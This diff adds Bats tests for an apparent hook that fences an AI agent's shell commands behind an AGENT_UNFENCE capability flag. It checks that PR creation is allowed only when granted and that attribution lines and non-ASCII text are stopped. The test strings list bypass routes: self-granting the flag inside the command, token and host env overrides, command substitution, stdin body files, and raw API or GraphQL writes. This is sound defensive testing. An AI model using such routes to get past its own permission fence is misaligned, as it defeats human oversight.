+    [ "$status" -eq 2 ]
+}
+
+# a quoted heredoc body is literal, so markdown and dollar signs are fine
+# there; the attribution and ascii scans still see it
+
+@test "pr allows backticks and dollars inside a quoted heredoc body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
+this PR adds \`make lint-sh\` and drops \$HOME from the \${PATH} lookup.
+
+- \`git push\` costs \$5 (\`\$(true)\`)
+EOF
+)\""
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<\"EOF\"
+\`code\`
+EOF
+)\""
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<\\EOF
+\`code\`
+EOF
+)\""
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows two quoted heredocs on one line" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
+\`one\`
+EOF
+)\" && gh pr create -t 'feat: y' -b \"\$(cat <<'EOF'
+\`two\`
+EOF
+)\""
+    [ "$status" -eq 0 ]
+}
+
+@test "pr blocks backticks in an unquoted heredoc body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<EOF
+\`cat /tmp/ai/body.md\`
+EOF
+)\""
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks backticks in a plain quoted body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'run \`make test\`'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a substitution outside the quoted heredoc" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
+\`code\`
+EOF
+)\" --head \"\$(git branch --show-current)\""
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a quoted heredoc with no terminator" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
+\`code\`
+)\""
+    [ "$status" -eq 2 ]
+}
+
+@test "pr still scans a quoted heredoc body for attribution and ascii" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
+does x
+
+Co-Authored-By: Claude <noreply@anthropic.com>
+EOF
+)\""
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
+does x $(printf '\342\200\224') y
+EOF
+)\""
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body file that is not a regular file" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file /dev/stdin < /tmp/ai/body.md"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file /dev/fd/0"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file /tmp"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body file from process substitution" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file <(printf 'x')"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks --recover" {
+    AGENT_UNFENCE=pr run fire "gh pr create --recover /tmp/ai/state.json"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks gh env overrides" {
+    AGENT_UNFENCE=pr run fire "GH_REPO=o/r gh pr create --fill"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "env GH_HOST=ghe.example.com gh pr create --fill"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "GH_TOKEN=x gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+# attribution and ascii
+
+@test "pr blocks a Co-Authored-By trailer in the body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'does x
+
+Co-Authored-By: Claude <noreply@anthropic.com>'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a Generated with line in the body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'does x
+
+Generated with [Claude Code](https://claude.com/claude-code)'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks attribution regardless of case" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'co-authored-by: someone'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks an em-dash in the body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'a $(printf '\342\200\224') b'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks an emoji in the body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b '$(printf '\360\237\244\226') generated'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a curly quote in the title" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: $(printf '\342\200\234')x$(printf '\342\200\235')' -b b"
+    [ "$status" -eq 2 ]
+}
+
+# body file
+
+@test "pr blocks a relative body file" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file body.md"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body file from stdin" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file -"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body file under an unexpanded variable" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file \$HOME/body.md"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file ~/body.md"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks an unreadable body file" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/missing.md"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body file carrying attribution" {
+    printf 'does x\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n' > "$BATS_TEST_TMPDIR/body.md"
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body file with non-ascii content" {
+    printf 'does x \342\200\224 and y\n' > "$BATS_TEST_TMPDIR/body.md"
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 2 ]
+}
+
+# pr lifts gh pr create only
+
+@test "pr does not lift gh pr edit / comment / ready / close" {
+    AGENT_UNFENCE=pr run fire "gh pr edit 1 --body x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr comment 1 --body x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr ready 1"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr close 1"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr does not lift gh pr merge" {
+    AGENT_UNFENCE=pr run fire "gh pr merge 1"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create --fill && gh pr merge --auto"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr does not lift gh issue create" {
+    AGENT_UNFENCE=pr run fire "gh issue create --title x --body y"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr does not lift a gh api pull-request write" {
+    AGENT_UNFENCE=pr run fire "gh api repos/o/r/pulls -f title=x -f head=b -f base=main"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh api -X POST repos/o/r/pulls --input body.json"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr does not lift a createPullRequest graphql mutation" {
+    AGENT_UNFENCE=pr run fire "gh api graphql -f query='mutation { createPullRequest(input: {}) { clientMutationId } }'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr does not lift git push" {
+    AGENT_UNFENCE=pr run fire "git push -u origin feature/x && gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr composes with push" {
+    AGENT_UNFENCE=push,pr run fire "git push -u origin feature/x && gh pr create --fill"
+    [ "$status" -eq 0 ]
+}
+
+@test "an unrelated capability does not lift the pr fence" {
+    AGENT_UNFENCE=push run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=meta run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+@test "an empty AGENT_UNFENCE does not lift the pr fence" {
+    AGENT_UNFENCE= run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+@test "a substring of a capability name does not lift the pr fence" {
+    AGENT_UNFENCE=prs run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=nopr run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+@test "the pr capability cannot be granted from inside the command text" {
+    run fire "env AGENT_UNFENCE=pr gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
